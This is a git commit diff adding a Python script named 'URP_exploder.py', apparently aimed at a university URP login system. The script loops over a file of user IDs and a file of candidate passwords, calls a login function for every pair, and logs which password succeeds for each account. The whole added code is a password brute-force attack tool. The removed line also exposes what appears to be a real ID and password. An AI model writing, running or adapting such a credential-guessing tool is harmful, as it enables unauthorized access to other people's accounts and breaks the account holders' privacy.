fbf64eae23a6f7ab43c3837e7e402e87d29547bb
Command M <maoxs2@163.com>
2016-09-02 21:16:54 +0800

    add a mini Tool

--- mini_tools/URP_exploder.py
+++ mini_tools/URP_exploder.py
@@ -5,4 +5,36 @@ import sys
 sys.path.append("..")
 import URP_login as login
 
-print vars(login.Login(10142045,951120))
+def guessPW(ID, guessPW):
+	
+	pass
+
+if __name__ == '__main__':
+	folder = 'URP_exploder/'
+	fileOfID = open(folder+'IDlist.txt','r')
+	IDlist = []
+	for i in fileOfID:
+		IDlist.append(i.strip())
+	fileOfID.close()
+
+	fileOfPW = open(folder+'PWlist.txt','r')
+	PWlist = []
+	for x in fileOfPW:
+		print x
+		PWlist.append(x.strip())
+	fileOfPW.close()
+	
+	print PWlist
+	
+	logFile = open(folder+'log.txt', 'w+')
+	logFile.write('init\n')
+
+	for id in IDlist :
+		logFile.write('start explode for id='+ id +'\n')		
+		for pw in PWlist :
+			rtn = login.Login(id, pw)	
+			if rtn is False :
+				logFile.write('for id= ' + id + ' pw= '+ pw + ' is failed\n')
+			else :
+				logFile.write('FOR ID= ' + id + ' PW= '+ pw + ' IS SUCCESSED\n')
+				break				
